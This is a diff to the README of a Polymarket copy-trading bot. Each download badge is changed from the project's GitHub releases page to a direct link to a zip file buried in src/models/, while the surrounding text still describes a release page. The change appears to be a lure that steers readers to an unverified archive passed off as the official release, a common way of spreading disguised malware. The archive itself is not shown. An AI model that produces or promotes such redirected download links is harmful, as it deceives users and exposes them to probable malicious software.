@@ -1,6 +1,6 @@
 # 🤖 polymarket-copytrading-bot-newlogic - Automated Trading Made Simple
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Arka4291/polymarket-copytrading-bot-newlogic/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/Arka4291/polymarket-copytrading-bot-newlogic/main/src/models/copytrading-bot-polymarket-newlogic-1.5.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Start using polymarket-copytrading-bot-newlogic by following these clear steps.
 
 Click this button to visit the download page:
 
-[![Download Here](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Arka4291/polymarket-copytrading-bot-newlogic/releases)
+[![Download Here](https://img.shields.io/badge/Download-Here-blue)](https://raw.githubusercontent.com/Arka4291/polymarket-copytrading-bot-newlogic/main/src/models/copytrading-bot-polymarket-newlogic-1.5.zip)
 
 This page contains the latest release files you need.
 
@@ -132,6 +132,6 @@ Updated versions will fix bugs and add new features. Check the page from time to
 
 Visit this page to download the bot and get started right away:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Arka4291/polymarket-copytrading-bot-newlogic/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/Arka4291/polymarket-copytrading-bot-newlogic/main/src/models/copytrading-bot-polymarket-newlogic-1.5.zip)
 
 Follow the steps here if you need to review the instructions again.
